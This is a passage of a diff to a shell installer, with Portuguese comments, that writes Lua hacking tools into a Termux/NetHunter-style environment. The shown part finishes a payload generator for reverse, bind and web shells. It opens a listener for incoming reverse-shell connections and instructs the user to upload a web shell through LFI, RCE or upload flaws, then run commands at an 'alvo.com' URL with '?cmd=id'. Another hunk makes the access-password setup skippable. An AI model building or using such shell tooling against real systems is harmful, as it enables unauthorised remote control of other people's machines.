+        show_payload(code, lang, ptype, (out_mode == 'mostrar + salvar') and outfile or nil)
+    end
+
+    -- Listener (só para reverse_shell)
+    if ptype == 'reverse_shell' then
+        print()
+        local listener = choose('Listener:', {
+            'abrir automaticamente agora',
+            'abrir manualmente depois',
+        }, 'abrir automaticamente agora')
+
+        if listener == 'abrir automaticamente agora' then
+            P(C.dim, '\n  Execute o payload no alvo e aguarde a conexao.')
+            io.write(C.dim..'  [ENTER para abrir o listener]'..C.reset)
+            io.read('*l')
+            run_listener(lport)
+        else
+            P(C.info, '\n  Para abrir o listener manualmente:')
+            P(C.dim, '  ms -f server.lua -- '..lport)
+            P(C.dim, '  (ou use: ms --listen '..lport..')\n')
+        end
+    elseif ptype == 'bind_shell' then
+        P(C.info, '\n  Execute o payload no alvo, depois conecte:')
+        P(C.dim, '  ms -f server.lua -- <ip_alvo> '..lport..'\n')
+    else
+        P(C.info, '\n  Envie o arquivo para o servidor via LFI/RCE/upload.')
+        P(C.dim, '  Acesso: http://alvo.com/'..
+            (outfile or 'shell.'..ext_for(lang))..
+            (lang=='php' and '?cmd=id' or '')..'\n')
+    end
+end
+
 main()
-LEARNEOF
-    chmod 644 "$_EX_DIR/learn.lua"
-    _ok "learn.lua instalado em $_EX_DIR/learn.lua"
+PAYLOADINSTEOF
+    chmod 644 "$_EX_DIR/payload.lua"
+    _ok "payload.lua instalado em $_EX_DIR/payload.lua"
 
     # ── recon.lua — recon completo ────────────────────────────────────────
     cat > "$_EX_DIR/recon.lua" << 'RECONEOF'
@@ -104356,7 +107621,7 @@ CUSTOM_C_EOF
     _setup_motd
 
     # ── Senha de acesso ───────────────────────────────────────────────────
-    _setup_password
+    [ "${_SKIP_PASS:-0}" = "1" ] || _setup_password
 
     # ── Prompt customizado (ElliotOS) ─────────────────────────────────────
     _setup_prompt
@@ -104874,7 +108139,7 @@ if [ -z "${PROOT_NO_SECCOMP:-}" ] && ! proot --link2symlink -0 -r "$NH_ROOTFS" -
   export PROOT_NO_SECCOMP=1
 fi
 
-exec proot   --link2symlink   -0   -r "$NH_ROOTFS"   $_BINDS   -b "${HOME}:/root"   -w /root   /usr/bin/env -i     HOME=/root     TERM="${TERM:-xterm-256color}"     LANG=C.UTF-8     PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin     /bin/bash --login "$@"
+exec proot   --link2symlink   -0   -r "$NH_ROOTFS"   $_BINDS   -w /root   /usr/bin/env -i     HOME=/root     TERM="${TERM:-xterm-256color}"     LANG=C.UTF-8     PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin     /bin/bash --login "$@"
 LAUNCHEOF
 
 chmod +x "$TERMUX_BIN/nethunter"
